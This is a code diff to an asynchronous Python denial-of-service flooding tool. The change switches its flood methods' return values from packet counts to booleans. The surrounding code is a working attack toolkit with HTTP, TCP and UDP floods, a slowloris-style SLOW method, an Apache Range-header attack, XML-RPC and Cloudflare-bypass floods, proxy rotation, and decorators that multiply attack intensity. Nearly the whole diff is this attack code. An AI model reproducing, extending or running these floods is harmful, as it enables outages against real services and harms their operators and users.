@@ -902,11 +902,11 @@ class HttpFlood:
 # XXX: there's literally no need for this class to exist
 class AsyncTcpFlood(HttpFlood):
 
-    async def run(self) -> int:
+    async def run(self) -> bool:
         return await self.SENT_FLOOD()
 
     # note that TCP_NODELAY is set by default since Python3.6+
-    async def open_connection(self) -> socket:
+    async def open_connection(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         if self._proxies:
             proxy_url: str = self._proxies.pick_random()
@@ -922,7 +922,7 @@ class AsyncTcpFlood(HttpFlood):
         return reader, writer
 
     # XXX: config for timeouts
-    async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> int:
+    async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
         rpc = rpc or self._rpc
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -938,14 +938,14 @@ class AsyncTcpFlood(HttpFlood):
             # XXX: i'm curious if there's a way to add "on_close" callback or something
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
     # XXX: again, with functions it's just a partial
-    async def GET(self) -> int:
+    async def GET(self) -> bool:
         payload: bytes = self.generate_payload()
         return await self._generic_flood(payload)
 
-    async def POST(self) -> int:
+    async def POST(self) -> bool:
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -953,7 +953,7 @@ class AsyncTcpFlood(HttpFlood):
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
         return await self._generic_flood(payload)
 
-    async def STRESS(self) -> int:
+    async def STRESS(self) -> bool:
         payload: bytes = self.generate_payload(
             (f"Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -961,7 +961,7 @@ class AsyncTcpFlood(HttpFlood):
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
         return await self._generic_flood(payload)
 
-    async def COOKIES(self) -> int:
+    async def COOKIES(self) -> bool:
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
             " _gat=1;"
@@ -972,12 +972,12 @@ class AsyncTcpFlood(HttpFlood):
         )
         return await self._generic_flood(payload)
     
-    async def APACHE(self) -> int:
+    async def APACHE(self) -> bool:
         payload: bytes = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
         return await self._generic_flood(payload)
     
-    async def XMLRPC(self) -> int:
+    async def XMLRPC(self) -> bool:
         payload: bytes = self.generate_payload(
             ("Content-Length: 345\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -991,10 +991,10 @@ class AsyncTcpFlood(HttpFlood):
              ProxyTools.Random.rand_str(64)))[:-2]
         return await self._generic_flood(payload)
     
-    async def PPS(self) -> int:
+    async def PPS(self) -> bool:
         return await self._generic_flood(self._defaultpayload)
     
-    async def DYN(self) -> int:
+    async def DYN(self) -> bool:
         payload: bytes = str.encode(
             self._payload +
             "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
@@ -1003,7 +1003,7 @@ class AsyncTcpFlood(HttpFlood):
         )
         return await self._generic_flood(payload)
     
-    async def GSB(self) -> int:
+    async def GSB(self) -> bool:
         payload: bytes = str.encode(
             "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                           self._target.raw_path_qs,
@@ -1024,7 +1024,7 @@ class AsyncTcpFlood(HttpFlood):
         )
         return await self._generic_flood(payload)
     
-    async def NULL(self) -> int:
+    async def NULL(self) -> bool:
         payload: bytes = str.encode(
             self._payload +
             "Host: %s\r\n" % self._target.authority +
@@ -1036,7 +1036,7 @@ class AsyncTcpFlood(HttpFlood):
 
     # XXX: timeout for each request
     @scale_attack(factor=3)
-    async def BYPASS(self) -> int:
+    async def BYPASS(self) -> bool:
         connector = self._proxies.pick_random_connector() if self._proxies else None
         packets_sent = 0
         async with aiohttp.ClientSession(connector=connector) as s:
@@ -1048,10 +1048,10 @@ class AsyncTcpFlood(HttpFlood):
                     # XXX: we need to track in/out traffic separately
                     self._stats.track(1, len(self._target.human_repr()))
                     packets_sent += 1
-        return packets_sent
+        return packets_sent > 0
     
     @scale_attack(factor=2)
-    async def CFBUAM(self) -> int:
+    async def CFBUAM(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1073,10 +1073,10 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
     @scale_attack(factor=5)
-    async def EVEN(self) -> int:
+    async def EVEN(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1092,14 +1092,14 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
     async def OVH(self) -> int:
         payload: bytes = self.generate_payload()
         return await self._generic_flood(payload, rpc=min(self._rpc, 5))
     
     @scale_attack(factor=5)
-    async def AVB(self) -> int:
+    async def AVB(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1115,10 +1115,10 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
     @scale_attack(factor=20)
-    async def SLOW(self) -> int:
+    async def SLOW(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1145,11 +1145,11 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
     # XXX: with default buffering setting this methods is gonna suck :(
     @scale_attack(factor=20)
-    async def DOWNLOADER(self) -> int:
+    async def DOWNLOADER(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1170,9 +1170,9 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
-    async def TCP(self) -> int:
+    async def TCP(self) -> bool:
         packets_sent, packet_size = 0, 1024
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
         self._stats.track_open_connection()
@@ -1187,16 +1187,16 @@ class AsyncTcpFlood(HttpFlood):
             writer.close()
             self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets_sent
+        return packets_sent > 0
 
 
 class AsyncUdpFlood(Layer4):
 
-    async def run(self) -> int:
+    async def run(self) -> bool:
         return await self.SENT_FLOOD()
 
     # XXX: have to process "no buffer OSError Errno=55 manually
-    async def UDP(self) -> int:
+    async def UDP(self) -> bool:
         packets_sent, packet_size = 0, 1024
         # XXX: this is not going to work as well, need to pass as params
         loop = asyncio.get_event_loop()
@@ -1207,7 +1207,7 @@ class AsyncUdpFlood(Layer4):
                 await asyncio.wait_for(loop.sock_sendall(sock, packet), timeout=1)
                 self._stats.track(1, packet_size)
                 packets_sent += 1
-        return packets_sent
+        return packets_sent > 0
 
 
 def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
